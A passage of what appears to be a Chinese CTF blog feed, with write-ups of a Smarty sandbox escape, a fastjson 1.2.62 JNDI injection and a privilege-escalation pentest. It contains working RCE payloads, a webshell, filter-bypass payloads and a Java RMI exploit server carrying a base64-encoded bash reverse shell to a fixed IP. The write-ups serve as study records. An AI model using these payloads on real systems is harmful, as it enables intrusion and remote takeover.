&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Always provide events to mail as plaintext.</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mail-&gt;setBody(implode(PHP_EOL, <span class="keyword">$this</span>-&gt;eventsToMail));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Finally, send the mail.  If an exception occurs, convert it into a</span></span><br><span class="line">    <span class="comment">// warning-level message so we can avoid an exception thrown without a</span></span><br><span class="line">    <span class="comment">// stack frame.</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;transport-&gt;send(<span class="keyword">$this</span>-&gt;mail);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TransportException\ExceptionInterface <span class="variable">$e</span>) &#123;</span><br><span class="line">        trigger_error(</span><br><span class="line">            <span class="string">&quot;unable to send log entries via email; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;message = <span class="subst">&#123;$e-&gt;getMessage()&#125;</span>; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;code = <span class="subst">&#123;$e-&gt;getCode()&#125;</span>; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;exception class = &quot;</span> . get_class(<span class="variable">$e</span>),</span><br><span class="line">            E_USER_WARNING</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.首先要求<code>$this-&gt;eventsToMail</code>不为空</p>
<p>2.<code>getFormattedNumEntriesPerPriority()</code>方法是将<code>$this-&gt;numEntriesPerPriority </code>数组转成字符串并返回字符串，而搜索了一下发现没有可用的<code>setSubject</code>方法，所以可以直接给<code>$this-&gt;subjectPrependText </code>赋值为null</p>
<p>3.可以找一下有没有可以利用的<code>setBody</code>，但是找了一圈不在，那又又又想到了<code>__call</code>方法，因为这次我们可以传入我们可控的参数，所以又想到了<code>PhpRenderer</code>的<code>__call</code>方法，然后再用<code>Config</code>里面的get方法，初始化<code>$this-&gt;data[&#39;setBody&#39;] = &#39;system&#39;</code>，然后只要我们通过修改<code>$this-&gt;eventsToMail</code>的值来进行命令执行就好了</p>
<p><strong>0x02:Stream-destruct开始</strong></p>
<p>在用别的师傅的poc之前，因为最开始看的cve说是从<code>Stream</code>的<code>__destruct</code>方法开始的，然后百度和这个题目给的不大一样，原来的if判断只判断了<code>$this-&gt;cleanup</code>是否为空，导致再unlink的时候触发<code>toString</code>方法，但是其实这里的<code>file_exits</code>也能触发<code>toString</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_resource(<span class="keyword">$this</span>-&gt;stream)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream = <span class="literal">null</span>; <span class="comment">//Could be listened by others</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cleanup &amp;&amp; is_string(<span class="keyword">$this</span>-&gt;streamName) &amp;&amp; file_exists(<span class="keyword">$this</span>-&gt;streamName)) &#123;</span><br><span class="line">            ErrorHandler::start(E_WARNING);</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;streamName);</span><br><span class="line">            ErrorHandler::stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以之后找一下有没有可以利用的<code>toString</code>方法，然而并没有（😅</p>
<h4 id="Smarty-Calculator"><a href="#Smarty-Calculator" class="headerlink" title="Smarty_Calculator"></a>Smarty_Calculator</h4><ul>
<li>Smarty沙箱绕过</li>
<li>CVE-2021-26119</li>
<li>CVE-2021-29454</li>
</ul>
<blockquote>
<p>复现捏</p>
</blockquote>
<h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26119">CVE - CVE-2021-26119 (mitre.org)</a></p>
<p><a href="https://www.cnblogs.com/sukusec301/p/15832670.html">CVE-2021-26119 PHP Smarty 模版沙箱逃逸远程代码执行漏洞 - sukusec不觉水流 - 博客园 (cnblogs.com)</a></p>
<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p><code>www.zip</code>泄露</p>
<p><code>index.php</code>，会先判断Cookie，检测·是否登录，并且过滤了<code>php|&lt;|flag|?</code>，之后直接调用<code>Smarty#display</code>，将data传进去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$pattern</span> = <span class="string">&quot;php|\&lt;|flag|\?&quot;</span>;</span><br><span class="line">  <span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$pattern</span>);</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$value</span>/&quot;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">		  <span class="keyword">echo</span>(<span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Calculator don  not like U&lt;h5&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">          <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$data</span> = waf(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Only smarty people can use calculators:&lt;h5&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span> . <span class="variable">$data</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;你还没有登录\&quot;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.venustech.com.cn/new_type/aqtg/20210226/22409.html">PHP Smarty模版代码注入漏洞（CVE-2021-26120）-启明星辰 (venustech.com.cn)</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;function+name=&#x27;rce()&#123;&#125;;system(&quot;id&quot;);function%0A%0A&#x27;&#125;&#123;/function&#125;</span><br></pre></td></tr></table></figure>

<p>但是不能路径穿越</p>
<p>可以写入一句话</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;function+name=&#x27;rce()&#123;&#125;;eval($_POST[&quot;1&quot;]);function%0A%0A&#x27;&#125;&#123;/function&#125;</span><br><span class="line"></span><br><span class="line">?1=system(&#x27;cat%20/flag&#x27;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>红明谷</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯-EzGadget</title>
    <url>/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF-EzGadget/</url>
    <content><![CDATA[<h1 id="蓝帽杯-Ez-gadget"><a href="#蓝帽杯-Ez-gadget" class="headerlink" title="[蓝帽杯]Ez_gadget"></a>[蓝帽杯]Ez_gadget</h1><ul>
<li>fastjson</li>
</ul>
<p>赛后复现：</p>
<p>利用题目给的jar包开一个环境</p>
<p><img src="https://img-blog.csdnimg.cn/d2812c6ccb0443539cac5a39f9172e1f.png" alt="Untitled"></p>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>可以首先看一下依赖包里面，可以发现存在fastjson1.2.62依赖和Tomcat依赖，而fastjson1.2.62的漏洞百度一下可以发现payload</p>
<blockquote>
<p>{“@type”:”org.apache.xbean.propertyeditor.JndiConverter”,”AsText”:”rmi://127.0.0.1:1099/exploit”}</p>
</blockquote>
<p><a href="https://www.cnblogs.com/tr1ple/p/12348886.html">https://www.cnblogs.com/tr1ple/p/12348886.html</a></p>
<p><img src="https://img-blog.csdnimg.cn/31f3451bfff3409fa9b0508edbe39cdb.png" alt="Untitled"></p>
<p>存在一个secretkey，在json路由下可以发现存在JSON反序列化，并且设置了<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code> ，说明可以利用<code>@type</code> 实现fastjson反序列化漏洞，但是if语句看一下可以发现存在hash碰撞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicclass JSONController &#123;</span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Your key is:&quot;</span> + secret.getKey();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/json&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Unserjson</span><span class="params">(<span class="meta">@RequestParam</span> String str, <span class="meta">@RequestParam</span> String input)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (str !=<span class="keyword">null</span> &amp;&amp;</span><br><span class="line">      Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) &#123;</span><br><span class="line">      String pattern = <span class="string">&quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\\\\\x.*&quot;</span>;</span><br><span class="line">      Pattern p = Pattern.compile(pattern, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">boolean</span> StrMatch = p.matcher(input).matches();</span><br><span class="line"><span class="keyword">if</span> (StrMatch)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Hacker get out!!!&quot;</span>;</span><br><span class="line">      ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">      JSON.parseObject(input);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java">https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">samehash</span><span class="params">(String s, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    String sub2 = s.substring(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> c0 = sub2.charAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> c1 = sub2.charAt(<span class="number">1</span>);</span><br><span class="line">    c0 = (<span class="keyword">char</span>) (c0 + level);</span><br><span class="line">    c1 = (<span class="keyword">char</span>) (c1 - <span class="number">31</span> * level);</span><br><span class="line">    String newsub2 = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; c0, c1 &#125;);</span><br><span class="line">    String re =  newsub2 + s.substring(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在正则匹配，从而存在过滤，但是可以利用unicode加密绕过</p>
<p>过滤：<code>String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\\\\\x.*&quot;;</code></p>
<h2 id="踩坑1"><a href="#踩坑1" class="headerlink" title="踩坑1"></a>踩坑1</h2><p>因为<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code> 打开了autotype，所有存在fastjson1.2.62的RCE，那就直接利用<code>marshalsec</code> 开一个ladp服务，并在vps某个目录下放一个恶意类，用python开服务命令如下：</p>
<p>python：</p>
<blockquote>
<p>python3 -m http.server —bind 0.0.0.0 8888</p>
</blockquote>
<p>marshalsec:</p>
<blockquote>
<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer ‘<a href="http://your_ip:8888/#Exploit&#39;">http://your_ip:8888/#Exploit&#39;</a></p>
</blockquote>
<p>payload:</p>
<blockquote>
<p>{“@type”:”org.apache.xbean.propertyeditor.JndiConverter”,”AsText”:”rmi://ip:1099/exploit”}</p>
</blockquote>
<p>但是发现虽然接收到了但是没有转到我们的恶意类那边，没有打开codebase</p>
<p><img src="https://img-blog.csdnimg.cn/fe7609da3b3d4513a90cae2952432937.png" alt="QQ图片20220710193008.png"></p>
<h2 id="踩坑2"><a href="#踩坑2" class="headerlink" title="踩坑2"></a>踩坑2</h2><p>因为org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，用的是SUS的exp</p>
<p>打包成jar包之后放到vps上执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> other;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tomc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rmi_port = <span class="number">9999</span>;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;82.156.2.166&quot;</span>);</span><br><span class="line">        System.out.println(System.getProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>));</span><br><span class="line"><span class="comment">//        String command =&quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;\\&quot;)&quot;;</span></span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\\&quot;</span>bash -c &#123;echo,YmFzaCUyMC1pJTIwJTNFJTI2L2Rldi90Y3AvODIuMTU2LjIuMTY2LzIzMzclMjAwJTNFJTI2MQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\<span class="string">&quot;);&quot;</span>;</span><br><span class="line">        String command = <span class="string">&quot;\\&quot;</span>\\<span class="string">&quot;.getClass().forName(\\&quot;</span>javax.script.ScriptEngineManager\\<span class="string">&quot;).newInstance().getEngineByName(\\&quot;</span>JavaScript\\<span class="string">&quot;).eval(\\&quot;</span><span class="string">&quot;+cmd+&quot;</span>\\<span class="string">&quot;)&quot;</span>;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(rmi_port);</span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;KINGX=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;KINGX&quot;</span>, command));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是不知道为什么弹shell没有成功</p>
<h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/</a></p>
<p>把Tomc类中的payload进行修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>执行Tomc类，开启RMI服务</p>
<p>payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatAttack</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//        JndiConverter</span></span><br><span class="line">        String s = <span class="string">&quot;&#123;\\&quot;</span><span class="meta">@type</span>\\<span class="string">&quot;:\\&quot;</span>org.apache.xbean.propertyeditor.JndiConverter\\<span class="string">&quot;,\\&quot;</span>AsText\\<span class="string">&quot;:\\&quot;</span>rmi:<span class="comment">//127.0.0.1:1558/Exploit\\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现虽然报错了但是还是执行了</p>
<p>开服务：</p>
<blockquote>
<p>java -jar .\ezgadget.jar</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d2812c6ccb0443539cac5a39f9172e1f.png" alt="Untitled"></p>
<p>RMI &amp; Registry</p>
<p><img src="https://img-blog.csdnimg.cn/70e7d8564daf4702bdd0169915631368.png" alt="Untitled"></p>
<p>执行：</p>
<p><img src="https://img-blog.csdnimg.cn/3029cee06c0b4f9f93a4faeba8b3113a.png" alt="Untitled"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h3><p><a href="https://blog.csdn.net/weixin_45890771/article/details/123096972">https://blog.csdn.net/weixin_45890771/article/details/123096972</a></p>
<p>本地开服务</p>
<p>自己复现之后，发现最关键的问题居然是exec里面的命令必须要用单引号包裹（？）为什么呢</p>
<p>跟了一下发现居然只是因为双引号闭合了导致命令出错了，为什么别人可以啊可恶！！！！</p>
<p><img src="https://img-blog.csdnimg.cn/c9671d230dbe4225a075bf6bebb5f14d.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/2fc8dfdb09cc4f5ca880c68bbe0537ac.png" alt="Untitled"></p>
<p>好吧还是把整个过程走一遍，就当记录学习过程了</p>
<p>直接利用本地的payload打断点开始调试，这里我们反序列化的函数和题目一样利用<code>JSON.parseObject</code></p>
<p>前面和<a href="https://ameuu.github.io/2022/04/15/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A3/">之前分析</a>过的一样，进入到了<code>DefaultJSONParser#parseObject</code> ，绕过解析空格之类的特殊字符，并获取<code>@type</code></p>
<p>因为开启了autotype，会直接获取typeName并进行实例化</p>
<p><img src="https://img-blog.csdnimg.cn/229945e9cd984cd69e9d0230efa12312.png" alt="Untitled"></p>
<p>并在后面利用对传入的payload进行了反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/b23d1dd903014c829cbf9796bdd7ddd1.png" alt="Untitled"></p>
<p>之后调用到<code>DefaultFieldDeserializer#parseField</code> ，对属性的值进行赋值，从而调用到了<code>DefaultFieldDeserializer#setValue</code> 也就相当于调用了setter将rmi的payload赋值给<code>AsText</code></p>
<p><img src="https://img-blog.csdnimg.cn/b30dac05930a432e97aeffcbf32f4696.png" alt="Untitled"></p>
<p>而<code>AbstractConverter#setAsText</code> 中会调用到<code>toObject</code> ，这应该就是关键点了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setAsText</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.toObject(text.trim());</span><br><span class="line">    <span class="keyword">super</span>.setValue(value);</span><br></pre></td></tr></table></figure>

<p>继续跟进之后发现，在之后调用到<code>JndiConverter#toObjectImpl</code> 的时候会调用到关键的lookup，而参数又是我们传进入的rmi</p>
<p><img src="https://img-blog.csdnimg.cn/d0ceb3dcc7e74db68c869a1960938c0e.png" alt="Untitled"></p>
<p>进到了exp开启的注册服务，并搜索到绑定了存在任意命令类的<code>Exploit</code></p>
<p><img src="https://img-blog.csdnimg.cn/78bf0023db0e49ccbdf3dcd9d6bfafcb.png" alt="Untitled"></p>
<p>之后通过Reference类从开启的注册服务中获取到了我们存放好的恶意类，并读取了其内容也就是包裹着命令执行的字符串（或许说是EL表达式），之后通过循环判断key，从而获取内容。当type为不可知的时候，就会调用到<code>ELProcessor#eval</code> 函数执行content从而实现了任意代码执行</p>
<p><img src="https://img-blog.csdnimg.cn/4df46415d2bb45c9b5feb33d4cd6c3ce.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/97414cccb9aa486191e4e93d7c544204.png" alt="Untitled"></p>
<p>而至于为什么赛时没有出结果，是因为payload中一直用到是双引号，但是由于eval中也用了双引号了包裹代码，导致发生了闭合从而不能识别整段代码，当然，我还是不能理解为什么当时的环境就连没有unicode的情况下还是没有任何回显</p>
<p><img src="https://img-blog.csdnimg.cn/c40b47b649b84789aa20897bb118a077.png" alt="Untitled"></p>
<h2 id="更新-远程复现"><a href="#更新-远程复现" class="headerlink" title="更新-远程复现"></a>更新-远程复现</h2><blockquote>
<p>之前虽然本地打通了，但是把环境简单部署到CTFD的时候，并没有复现成功，最近参加了羊城杯发现了问题所在，重新复现一下！但由于实验室网进不去，就部署在了自己的服务器上</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/36fb21093fa44315a3f1cde354464d11.png" alt="image-20220906191751340"></p>
<p>前面就根据hash碰撞得到对应的字符串<code>OSpA4iEYU8Winr4X</code>，</p>
<p>利用<a href="https://github.com/welk1n/JNDI-Injection-Bypass%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%BC%80%E6%9C%8D%E5%8A%A1">https://github.com/welk1n/JNDI-Injection-Bypass工具，开服务</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer ip</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/1764b5a047804322b32090e7c36ae264.png" alt="image-20220906191958901"></p>
<p>看过工具源码可以知道如果是EL和Groovy的话会对直接构造反弹shell payload，直接监听5555端口</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json?str=OSpA4iEYU8Winr4X&amp;input=%7B%22%40type%22%3A%22org.apache.xbean.propertyeditor.%5Cu004a%5Cu006e%5Cu0064%5Cu0069Converter%22%2C%22AsText%22%3A%22%5Cu0072%5Cu006d%5Cu0069%3A%2F%2Fip%3A1097%2FExecByEL%22%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/495ef4dea42c451ea2d606bde0dd0e0d.png" alt="image-20220906192123824"></p>
<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>有时候总会过度依赖别人，虽然会自己去验证一些事，但是如果遇到了看起来难以解决的问题的时候就会寄希望于其他人，完全否定了自己的能力……</p>
<p>希望自己能够坚持学习，找到志同道合的web手这种事就随缘吧，现在也挺好的，虽然进度可能比较慢但是至少不会经常在乎别人的想法</p>
<p>并且战队和固定小队里的师傅那么厉害，难免会有点焦虑，也算是一种动力……</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>蓝帽杯</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>记从校赛学到的新知识</title>
    <url>/2022/04/12/%E8%AE%B0%E4%BB%8E%E6%A0%A1%E8%B5%9B%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<blockquote>
<p>渗透、CC6实际场景利用初体验</p>
</blockquote>
<span id="more"></span>

<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p><a href="https://jasonttu.github.io/2022/01/17/VulnHub-Empire-LupinOne/?highlight=fuf#VulnHub-Empire-LupinOne">wp</a></p>
<p><a href="https://blog.csdn.net/weixin_43220532/article/details/116023233">linux下ssh使用除了22的其它端口来连接远程服务器_CrystalheartLi的博客-CSDN博客_linux除了ssh还有什么能链接服务器</a></p>
<p>问题：</p>
<ul>
<li>kali默认连接端口要增加10022</li>
<li>sshkey文件要增加权限</li>
</ul>
<p>简单记录一下：</p>
<blockquote>
<p>hint:</p>
<p>1.ssh连接10022</p>
<p>2.ffuf  /~hint</p>
</blockquote>
<p>题目有<code>robots.txt</code></p>
<p>进入<code>/~hint/</code>，是假的Error界面</p>
<h4 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://172.22.236.111:8080/~FUZZ -w /usr/share/wfuzz/wordlist/general/common.txt </span><br></pre></td></tr></table></figure>

<p>有<code>~secret</code>，用户为<code>jasontt</code>，密码为<code>1234</code></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220409193703147.png" alt="image-20220409193703147"></p>
<p>要找<code>ssh private key</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://172.22.236.111:8080/~secret/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403 -e .txt,.html,.php</span><br></pre></td></tr></table></figure>

<p>有<code>secret.txt</code>，私钥在这里</p>
<p>base85解密，复制黏贴到kali，新建文件<code>sshkey</code></p>
<blockquote>
<p>注意ssh私钥的格式 在末尾会有一个换行符</p>
</blockquote>
<p>ssh连接</p>
<blockquote>
<p>注意本地的 sshd_config 里面要加上10022端口</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i sshkey jasontt@172.22.36.111 -p 10022</span><br></pre></td></tr></table></figure>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><a href="https://jasonttu.github.io/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/#more">Python库劫持</a></p>
<p><code>sudo -l</code>  // 显示出自己（执行 sudo 的使用者）的权限</p>
<p>可以发现我们有无密（root）权限执行</p>
<p>本地有<code>Tiquan.py</code>，调用了<code>webbrowser.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate webbrowser.py</span><br><span class="line"># /usr/lib/python3.8/webbrowser.py</span><br></pre></td></tr></table></figure>

<p>而<code>webbrowser.py</code>里面执行了<code>os.system(&quot;/bin/bash&quot;)</code></p>
<blockquote>
<p>赛时做的时候不知道为什么 执行这条命令的时候没有成功进入root </p>
<p>赛后，后来发现os.system没有 用nano加了一下才进去</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root /usr/bin/python3.8 /home/jasontt/Tiquan.py</span><br><span class="line"># 进入root</span><br></pre></td></tr></table></figure>

<p>flag在根目录</p>
<h3 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h3><ul>
<li>java 反序列化</li>
</ul>
<h4 id="赛前"><a href="#赛前" class="headerlink" title="赛前:"></a>赛前:</h4><blockquote>
<p>因为某些原因 一直以为是tomcat内存马 fastjson去了</p>
</blockquote>
<blockquote>
<p>看了wp发现原来没有想象中那么难</p>
</blockquote>
<blockquote>
<p>hint打不开(!!!!!!!!!! 也完全找不到</p>
</blockquote>
